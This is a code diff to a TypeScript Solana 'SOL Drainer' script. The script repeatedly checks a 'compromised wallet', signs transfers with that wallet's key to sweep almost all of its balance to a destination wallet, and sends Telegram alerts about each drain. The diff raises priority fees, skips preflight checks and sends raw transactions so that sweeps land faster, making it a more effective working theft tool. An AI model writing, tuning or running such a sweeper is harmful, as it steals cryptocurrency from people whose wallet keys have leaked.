@@ -65,6 +65,8 @@ async function sendTelegram(text: string) {
   } catch {}
 }
 
+let lastKnownBalance = 0;
+
 async function drainLoop() {
   if (!isRunning || isDraining) return;
   isDraining = true;
@@ -76,14 +78,37 @@ async function drainLoop() {
     const sourcePubkey = new PublicKey(SOURCE_WALLET);
     const balance = await connection.getBalance(sourcePubkey);
 
+    if (lastKnownBalance > 0 && balance < lastKnownBalance - MIN_DRAIN_LAMPORTS) {
+      const drained = (lastKnownBalance - balance) / LAMPORTS_PER_SOL;
+      console.log(`[SOL Drainer] Balance dropped by ${drained.toFixed(6)} SOL (drain confirmed)`);
+      drainCount++;
+      totalDrained += (lastKnownBalance - balance);
+      lastDrainTime = new Date().toISOString();
+
+      await sendTelegram(
+        `<b>SOL Drainer</b>\n` +
+        `Drained <b>${drained.toFixed(6)} SOL</b> from compromised wallet\n` +
+        `Remaining: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
+      );
+    }
+    lastKnownBalance = balance;
+
     const drainable = balance - TOTAL_FEE - KEEP_LAMPORTS;
 
     if (drainable >= MIN_DRAIN_LAMPORTS) {
       const solAmount = drainable / LAMPORTS_PER_SOL;
-      console.log(`[SOL Drainer] Found ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL - draining ${solAmount.toFixed(6)} SOL`);
+      console.log(`[SOL Drainer] Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL - sending drain tx for ${solAmount.toFixed(6)} SOL`);
 
-      const tx = new Transaction().add(
-        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }),
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+
+      const tx = new Transaction();
+      tx.recentBlockhash = blockhash;
+      tx.lastValidBlockHeight = lastValidBlockHeight;
+      tx.feePayer = sourcePubkey;
+
+      tx.add(
+        ComputeBudgetProgram.setComputeUnitLimit({ units: 200 }),
+        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 500_000 }),
         SystemProgram.transfer({
           fromPubkey: sourcePubkey,
           toPubkey: new PublicKey(DESTINATION_WALLET),
@@ -91,32 +116,21 @@ async function drainLoop() {
         })
       );
 
-      const sig = await sendAndConfirmTransaction(connection, tx, [keypair], {
+      tx.sign(keypair);
+
+      const sig = await connection.sendRawTransaction(tx.serialize(), {
         skipPreflight: true,
-        maxRetries: 3,
+        maxRetries: 2,
       });
 
-      drainCount++;
-      totalDrained += drainable;
-      lastDrainTime = new Date().toISOString();
-      consecutiveErrors = 0;
-
-      console.log(`[SOL Drainer] Drained ${solAmount.toFixed(6)} SOL -> ${DESTINATION_WALLET.slice(0, 8)}... | tx: ${sig}`);
-
-      await sendTelegram(
-        `<b>SOL Drainer</b>\n` +
-        `Drained <b>${solAmount.toFixed(6)} SOL</b> from compromised wallet\n` +
-        `To: ${DESTINATION_WALLET.slice(0, 8)}...${DESTINATION_WALLET.slice(-4)}\n` +
-        `Remaining: ~${(KEEP_LAMPORTS / LAMPORTS_PER_SOL).toFixed(6)} SOL\n` +
-        `TX: ${sig.slice(0, 16)}...`
-      );
+      console.log(`[SOL Drainer] Sent drain tx: ${sig.slice(0, 20)}...`);
     }
 
     consecutiveErrors = 0;
   } catch (error: any) {
     consecutiveErrors++;
     if (consecutiveErrors <= 3) {
-      console.error(`[SOL Drainer] Error:`, error?.message?.slice(0, 100));
+      console.error(`[SOL Drainer] Error:`, error?.message?.slice(0, 150));
     }
     if (consecutiveErrors % 10 === 0) {
       rotateRpc();
@@ -180,16 +194,23 @@ export async function triggerSolDrain() {
       };
     }
 
-    const tx = new Transaction().add(
-      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }),
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+    const tx = new Transaction();
+    tx.recentBlockhash = blockhash;
+    tx.lastValidBlockHeight = lastValidBlockHeight;
+    tx.feePayer = sourcePubkey;
+    tx.add(
+      ComputeBudgetProgram.setComputeUnitLimit({ units: 200 }),
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 500_000 }),
       SystemProgram.transfer({
         fromPubkey: sourcePubkey,
         toPubkey: new PublicKey(DESTINATION_WALLET),
         lamports: drainable,
       })
     );
+    tx.sign(keypair);
 
-    const sig = await sendAndConfirmTransaction(connection, tx, [keypair], {
+    const sig = await connection.sendRawTransaction(tx.serialize(), {
       skipPreflight: true,
       maxRetries: 3,
     });
